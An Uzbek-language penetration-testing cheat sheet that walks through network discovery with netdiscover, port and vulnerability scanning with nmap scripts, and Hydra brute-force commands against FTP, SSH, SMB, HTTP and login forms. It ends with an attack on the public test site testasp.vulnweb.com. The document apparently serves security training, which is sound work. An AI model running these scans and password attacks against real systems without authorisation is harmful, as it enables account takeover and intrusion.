**1. Veb-ilovani skanerlash va zaifliklarni aniqlash**   
Birinchi qadam – IP manzilni skanerlash va veb-ilovaning qanday texnologiyalar asosida ishlayotganini aniqlash.  

1. Lokal tarmoqdagi (LAN) IP manzillar va MAC manzillarini aniqlash uchun tarmoqni skanerlash.   
```
netdiscover -r 192.168.1.0/24
```

```
netdiscover -i wlan0 -r 192.168.0.0/16
```

2. Ochiq portlar va xizmatlarni aniqlash (Port Scanning).   
```
nmap -sC -sV -A -p- <IP-manzil>
```

3. Xizmatga bog‘liq zaifliklarni aniqlash.
```
cd /usr/share/nmap/scripts/
ls -al *vulns*
```   
 -  **FTP zaifligini aniqlash:**
```
nmap --script ftp-vuln* -p 21 [IP-manzil]
```
 - **SMB zaifligini aniqlash:**   
```
nmap --script smb-vuln* -p 445 [IP-manzil]
```
 - **HTTP zaifligini aniqlash:**
```
nmap --script http-vuln* -p 80 [IP-manzil]
```   
 - **Nmap-Vulners**
```
git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/vulners
nmap --script-updatedb
nmap -sV -Pn 192.168.1.12 --script=vulners/vulners.nse
```

4. Hydra yordamida FTP, SSH, SMB va HTTP xizmatlariga Brute-Force hujumi. (`sudo apt update && sudo apt install hydra -y`)   
 - **FTP ga Brute-Force qilish**
```
ls /usr/share/wordlists
hydra -l admin -P passwords.txt ftp://192.168.1.10
hydra -L users.txt -P passwords.txt ftp://192.168.1.10
```
 - **SSH ga Brute-Force qilish**
```
hydra -l root -P passwords.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
hydra -l root -P passwords.txt ssh://192.168.1.10:2222
```
 - **SMB ga Brute-Force qilish**
```
hydra -L users.txt -P passwords.txt smb://192.168.1.10
hydra -L users.txt -P passwords.txt smb://domain/192.168.1.10
```
 - **HTTP Basic Authentication Brute-Force**
```
hydra -l admin -P passwords.txt http://192.168.1.10
hydra -l admin -P passwords.txt http-get://192.168.1.10/admin
```
 - **HTTP POST Form Brute-Force**
```
hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form "/admin:username=^USER^&password=^PASS^:Login failed"
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"
```

```
http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F
hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
```
